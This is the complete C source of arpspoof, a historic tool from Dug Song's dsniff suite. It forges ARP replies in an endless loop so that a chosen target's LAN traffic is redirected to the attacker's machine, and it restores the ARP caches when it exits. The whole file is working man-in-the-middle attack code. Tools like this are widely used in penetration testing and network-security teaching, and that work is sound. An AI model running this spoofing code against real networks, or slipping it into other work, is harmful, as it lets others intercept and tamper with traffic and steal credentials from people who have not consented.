/*
 * arpspoof.c
 *
 * Redirect packets from a target host (or from all hosts) intended for
 * another host on the LAN to ourselves.
 * 
 * Copyright (c) 1999 Dug Song <dugsong@monkey.org>
 *
 * $Id: arpspoof.c,v 1.5 2001/03/15 08:32:58 dugsong Exp $
 */

#include "config.h"

#include <sys/types.h>
#include <sys/param.h>
#include <netinet/in.h>

#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <err.h>
#include <libnet.h>
#include <pcap.h>

#include "arp.h"
#include "version.h"

extern char *ether_ntoa(struct ether_addr *);

static struct libnet_link_int *llif;
static struct ether_addr spoof_mac, target_mac;
static in_addr_t spoof_ip, target_ip;
static char *intf;

static void
usage(void)
{
	fprintf(stderr, "Version: " VERSION "\n"
		"Usage: arpspoof [-i interface] [-t target] host\n");
	exit(1);
}

static int
arp_send(struct libnet_link_int *llif, char *dev,
	 int op, u_char *sha, in_addr_t spa, u_char *tha, in_addr_t tpa)
{
	char ebuf[128];
	u_char pkt[60];
	
	if (sha == NULL &&
	    (sha = (u_char *)libnet_get_hwaddr(llif, dev, ebuf)) == NULL) {
		return (-1);
	}
	if (spa == 0) {
		if ((spa = libnet_get_ipaddr(llif, dev, ebuf)) == 0)
			return (-1);
		spa = htonl(spa); /* XXX */
	}
	if (tha == NULL)
		tha = "\xff\xff\xff\xff\xff\xff";
	
	libnet_build_ethernet(tha, sha, ETHERTYPE_ARP, NULL, 0, pkt);
	
	libnet_build_arp(ARPHRD_ETHER, ETHERTYPE_IP, ETHER_ADDR_LEN, 4,
			 op, sha, (u_char *)&spa, tha, (u_char *)&tpa,
			 NULL, 0, pkt + ETH_H);

	fprintf(stderr, "%s ",
		ether_ntoa((struct ether_addr *)sha));

	if (op == ARPOP_REQUEST) {
		fprintf(stderr, "%s 0806 42: arp who-has %s tell %s\n",
			ether_ntoa((struct ether_addr *)tha),
			libnet_host_lookup(tpa, 0),
			libnet_host_lookup(spa, 0));
	}
	else {
		fprintf(stderr, "%s 0806 42: arp reply %s is-at ",
			ether_ntoa((struct ether_addr *)tha),
			libnet_host_lookup(spa, 0));
		fprintf(stderr, "%s\n",
			ether_ntoa((struct ether_addr *)sha));
	}
	return (libnet_write_link_layer(llif, dev, pkt, sizeof(pkt)) == sizeof(pkt));
}

#ifdef __linux__
static int
arp_force(in_addr_t dst)
{
	struct sockaddr_in sin;
	int i, fd;
	
	if ((fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0)
		return (0);

	memset(&sin, 0, sizeof(sin));
	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = dst;
	sin.sin_port = htons(67);
	
	i = sendto(fd, NULL, 0, 0, (struct sockaddr *)&sin, sizeof(sin));
	
	close(fd);
	
	return (i == 0);
}
#endif

static int
arp_find(in_addr_t ip, struct ether_addr *mac)
{
	int i = 0;

	do {
		if (arp_cache_lookup(ip, mac, intf) == 0)
			return (1);
#ifdef __linux__
		/* XXX - force the kernel to arp. feh. */
		arp_force(ip);
#else
		arp_send(llif, intf, ARPOP_REQUEST, NULL, 0, NULL, ip);
#endif
		sleep(1);
	}
	while (i++ < 3);

	return (0);
}

static void
cleanup(int sig)
{
	int i;
	
	if (arp_find(spoof_ip, &spoof_mac)) {
		for (i = 0; i < 3; i++) {
			/* XXX - on BSD, requires ETHERSPOOF kernel. */
			arp_send(llif, intf, ARPOP_REPLY,
				 (u_char *)&spoof_mac, spoof_ip,
				 (target_ip ? (u_char *)&target_mac : NULL),
				 target_ip);
			sleep(1);
		}
	}
	exit(0);
}

int
main(int argc, char *argv[])
{
	extern char *optarg;
	extern int optind;
	char ebuf[PCAP_ERRBUF_SIZE];
	int c;
	
	intf = NULL;
	spoof_ip = target_ip = 0;
	
	while ((c = getopt(argc, argv, "i:t:h?V")) != -1) {
		switch (c) {
		case 'i':
			intf = optarg;
			break;
		case 't':
			if ((target_ip = libnet_name_resolve(optarg, 1)) == -1)
				usage();
			break;
		default:
			usage();
		}
	}
	argc -= optind;
	argv += optind;
	
	if (argc != 1)
		usage();
	
	if ((spoof_ip = libnet_name_resolve(argv[0], 1)) == -1)
		usage();
	
	if (intf == NULL && (intf = pcap_lookupdev(ebuf)) == NULL)
		errx(1, "%s", ebuf);
	
	if ((llif = libnet_open_link_interface(intf, ebuf)) == 0)
		errx(1, "%s", ebuf);
	
	if (target_ip != 0 && !arp_find(target_ip, &target_mac))
		errx(1, "couldn't arp for host %s",
		     libnet_host_lookup(target_ip, 0));
	
	signal(SIGHUP, cleanup);
	signal(SIGINT, cleanup);
	signal(SIGTERM, cleanup);
	
	for (;;) {
		arp_send(llif, intf, ARPOP_REPLY, NULL, spoof_ip,
			 (target_ip ? (u_char *)&target_mac : NULL),
			 target_ip);
		sleep(2);
	}
	/* NOTREACHED */
	
	exit(0);
}
